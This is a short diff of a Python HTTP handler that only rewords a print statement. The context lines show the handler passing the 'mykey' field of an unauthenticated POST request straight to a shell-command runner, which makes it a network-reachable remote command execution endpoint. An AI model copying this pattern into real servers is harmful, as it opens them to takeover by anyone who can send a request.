@@ -16,7 +16,7 @@ class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
         post_data = self.rfile.read(datalen).decode("utf-8")
         print("I received this data ->", post_data)
         payload_data = parse.parse_qs(post_data)["mykey"][0]
-        print(payload_data)
+        print("This is my parsed data -> ", payload_data)
         resp = self.run_shell_command(payload_data)
         self.send_response(200)
         self.end_headers()
